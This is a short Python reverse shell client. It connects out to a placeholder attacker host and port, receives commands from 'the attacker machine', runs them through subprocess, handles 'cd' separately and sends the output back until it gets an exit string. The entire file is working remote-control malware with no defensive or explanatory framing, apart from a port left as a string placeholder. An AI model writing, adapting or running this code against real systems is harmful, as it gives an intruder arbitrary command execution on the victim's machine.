import socket
import subprocess
import os

SERVER_HOST = "HOST"
SERVER_PORT = "PORT"
BUFFER = 1024
s = socket.socket()
try:
    s.connect((SERVER_HOST, SERVER_PORT))
except:
    exit(0)
while True:
    # We receive a message from the attacker machine
    command = s.recv(BUFFER).decode()
    # Now we split the command
    command_list = command.split()
    # We check if the first part of the command is 'cd'
    if(command == "you-exit-now"):
        break
    # Else if the command start with cd
    if(command_list[0] == "cd"):
        try:
            # try to change the repository
            os.chdir(" ".join(command_list[1:]))
            result = "New Path : "+os.getcwd()
        except FileNotFoundError:
            result = "[+] Error : File not found"
        except NotADirectoryError:
            result = "[+] Error : Path is not a directory"
    else:
        # If the command is not a cd we execute them
        result = subprocess.getoutput(command)
        # Now we send the resukt to the server
    s.send(result.encode())
s.close()
